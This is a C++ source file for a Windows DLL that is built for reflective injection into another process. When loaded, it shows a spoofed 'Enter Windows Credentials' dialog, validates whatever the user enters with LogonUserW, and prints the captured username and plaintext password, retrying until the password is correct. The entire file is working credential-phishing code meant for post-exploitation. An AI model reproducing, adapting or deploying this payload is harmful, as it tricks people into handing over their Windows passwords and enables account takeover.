//===============================================================================================//
// This is a stub for the actuall functionality of the DLL.
//===============================================================================================//
#include "ReflectiveLoader.h"
#include <windows.h>
#include <commctrl.h>
#include <wincred.h>
#include <iostream>
#include <stdio.h>
#include <errno.h>

#pragma comment(lib, "comctl32.lib")
#pragma comment(lib, "Credui.lib")

void askForCreds(DWORD maxTries);

// Note: REFLECTIVEDLLINJECTION_VIA_LOADREMOTELIBRARYR and REFLECTIVEDLLINJECTION_CUSTOM_DLLMAIN are
// defined in the project properties (Properties->C++->Preprocessor) so as we can specify our own 
// DllMain and use the LoadRemoteLibraryR() API to inject this DLL.

// You can use this value as a pseudo hinstDLL value (defined and set via ReflectiveLoader.c)
extern HINSTANCE hAppInstance;
//===============================================================================================//
BOOL WINAPI DllMain( HINSTANCE hinstDLL, DWORD dwReason, LPVOID lpReserved )
{
    BOOL bReturnValue = TRUE;
	switch( dwReason ) 
    { 
		case DLL_QUERY_HMODULE:
			if( lpReserved != NULL )
				*(HMODULE *)lpReserved = hAppInstance;
			break;
		case DLL_PROCESS_ATTACH:
			hAppInstance = hinstDLL;
			askForCreds(3);
			fflush(stdout);
			break;
		case DLL_PROCESS_DETACH:
		case DLL_THREAD_ATTACH:
		case DLL_THREAD_DETACH:
            break;
    }
	return bReturnValue;
}

void askForCreds(DWORD maxTries) {

	BOOL loginStatus = FALSE;
	DWORD numTries = 0;

	while ((loginStatus == FALSE) && (numTries < maxTries)) {
		numTries += 1;

		CREDUI_INFOW uiInfo = {};
		uiInfo.cbSize = sizeof(uiInfo);
		uiInfo.hwndParent = nullptr;
		uiInfo.pszCaptionText = L"Enter Windows Credentials";
		uiInfo.pszMessageText = L"Enter your credentials to proceed:"; // optional
		uiInfo.hbmBanner = nullptr;

		ULONG authPackage = 0;
		LPVOID authBuffer = nullptr;
		ULONG ulAuthBufferSize = 0;
		BOOL fSave = false;
		DWORD dwAuthError = 0;
		dwAuthError = CredUIPromptForWindowsCredentialsW(
			&uiInfo,
			0,
			&authPackage,
			nullptr,
			0,
			&authBuffer,
			&ulAuthBufferSize,
			&fSave,
			CREDUIWIN_ENUMERATE_CURRENT_USER
		);

		if (dwAuthError == ERROR_SUCCESS) {
			WCHAR pszUserName[CREDUI_MAX_USERNAME_LENGTH * sizeof(WCHAR)];
			DWORD dwMaxUserName = CREDUI_MAX_USERNAME_LENGTH + 1;
			WCHAR pszDomainName[CREDUI_MAX_DOMAIN_TARGET_LENGTH * sizeof(WCHAR)];
			DWORD dwMaxDomainName = CREDUI_MAX_DOMAIN_TARGET_LENGTH + 1;
			WCHAR pszPassword[CREDUI_MAX_PASSWORD_LENGTH * sizeof(WCHAR)];
			DWORD dwMaxPassword = CREDUI_MAX_PASSWORD_LENGTH + 1;
			CredUnPackAuthenticationBufferW(
				CRED_PACK_PROTECTED_CREDENTIALS,
				authBuffer,
				ulAuthBufferSize,
				pszUserName,
				&dwMaxUserName,
				pszDomainName,
				&dwMaxDomainName,
				pszPassword,
				&dwMaxPassword
			);

			WCHAR parsedUserName[CREDUI_MAX_USERNAME_LENGTH * sizeof(WCHAR)];
			WCHAR parsedDomain[CREDUI_MAX_DOMAIN_TARGET_LENGTH * sizeof(WCHAR)];
			CredUIParseUserNameW(
				pszUserName,
				parsedUserName,
				CREDUI_MAX_USERNAME_LENGTH + 1,
				parsedDomain,
				CREDUI_MAX_DOMAIN_TARGET_LENGTH + 1
			);

			HANDLE handle = nullptr;
			loginStatus = LogonUserW(
				parsedUserName,
				parsedDomain,
				pszPassword,
				LOGON32_LOGON_NETWORK,
				LOGON32_PROVIDER_DEFAULT,
				&handle
			);

			if (loginStatus == TRUE) {
				CloseHandle(handle);
				fwprintf(stdout, L"Correct credentials: %s:%s\n", pszUserName, pszPassword);
				break;
			}
			else {
				fwprintf(stdout, L"Wrong credentials: %s:%s\n", pszUserName, pszPassword);
			}
		}
	}
}